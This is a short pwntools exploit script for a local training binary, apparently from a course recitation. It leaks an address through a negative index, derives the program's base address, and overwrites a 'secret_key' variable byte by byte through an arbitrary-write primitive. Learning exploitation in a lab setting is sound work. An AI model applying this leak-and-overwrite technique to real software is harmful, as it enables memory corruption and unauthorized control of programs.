from pwn import *

context.log_level = "DEBUG"
e = ELF("./recitation5.3", checksec=False)
p = process("./recitation5.3")

p.recvuntil(b"?\n")
p.send(b"-2")
p.recvuntil(b"like ")
leak = int(p.recvuntil(b" ").strip(), 16)
e.address = leak - e.symbols.secret_key
assert e.address == e.address & ~0xfff

new_key = [byte for byte in p64(0xdeadbeef1337c0d3)]
for i in range(0,8):
    p.recvuntil(b"> ")
    p.send(p64(e.symbols.secret_key + i))
    p.recvuntil(b"> ")
    p.send(p8(new_key[i]))
p.interactive()
